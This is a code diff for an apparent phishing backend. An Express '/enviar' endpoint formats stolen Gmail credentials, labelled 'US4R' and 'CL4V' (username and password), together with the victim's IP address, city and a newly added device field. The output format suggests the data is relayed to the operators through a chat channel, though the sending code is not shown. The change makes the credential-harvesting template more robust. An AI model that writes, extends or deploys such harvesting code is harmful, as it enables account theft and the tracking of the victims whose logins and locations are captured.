@@ -56,8 +56,10 @@ app.post('/enviar', async (req, res) => {
 ❤️GM4YL❤️
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: <code>${usar}</code>
-🔐 CL4V: <code>${clav}</code>
+📱 US4R: <code>${usar || 'No disponible'}</code>
+🔐 CL4V: <code>${clav || 'No disponible'}</code>
+
+📱 DISP: ${req.body.dispositivo || 'No detectado'}
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
